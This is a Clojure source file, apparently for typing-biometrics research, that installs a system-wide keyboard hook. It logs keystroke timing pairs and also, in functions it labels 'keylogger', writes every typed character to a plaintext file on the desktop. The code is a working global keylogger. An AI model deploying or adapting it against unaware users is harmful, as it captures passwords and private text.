(ns typing-biometrics.core
  (:gen-class)
  ;(:import java.awt.event.KeyEvent)
  (:import org.jnativehook.GlobalScreen)
  (:import org.jnativehook.keyboard.NativeKeyListener)
  (:require [clojure.java.io :as io]))


(defn write [q] ;;keylogger
  (with-open [w (io/writer "C:\\Users\\ITsec\\Desktop\\temp.txt" :append true)]
    (.write w (str q))))

(defn write2 [a ms1 ms2] ;; [keyBefore currentKey] timeKeyPressed timeBeforeLastTwoKeysPressed
  (with-open [w (io/writer (str "C:\\Users\\ITsec\\Desktop\\temp2.txt") :append true)]
    (.write w (str a " " ms1 " " ms2 " \n"))))


(def key-pressed "null")
(def key-released "null")
(def old-key "null")
(def old-key-released "null")
(def old-new "null")



(defn key-action [e action] 
  (let [current-key (.getRawCode e)]
    (str (print action " " current-key "  " e ))
    (println (System/currentTimeMillis))


    (if (= action "key-pressed")
      (do (def key-pressed (System/currentTimeMillis))
          (def old-new [old-key current-key]))
    (do
      (def key-released (System/currentTimeMillis))
      (write2  old-new (- key-released key-pressed) (- key-pressed old-key-released))
      (def old-new []))
    
    )



    (def old-key current-key)
    (def old-key-released key-released)
    
    
    )
  )





(defn key-typed [e] ;;keylogger;;;;;
  (let [k (.getKeyChar e)]
    (write k)))

(defn myGlobalKeyListener []
  (reify
    NativeKeyListener    
    (nativeKeyPressed [this event] (key-action event "key-pressed")) ;;button pressed and time
    (nativeKeyReleased [this event] (key-action event "key-released")) ;;button released and time
    (nativeKeyTyped [this event] (key-typed event)))) ;; standard keylogger


(defn mainMethod []
  (GlobalScreen/registerNativeHook)
  (.addNativeKeyListener (GlobalScreen/getInstance) (myGlobalKeyListener))
  (println "keylogger started")) 




(defn -main [& args]
  (mainMethod))
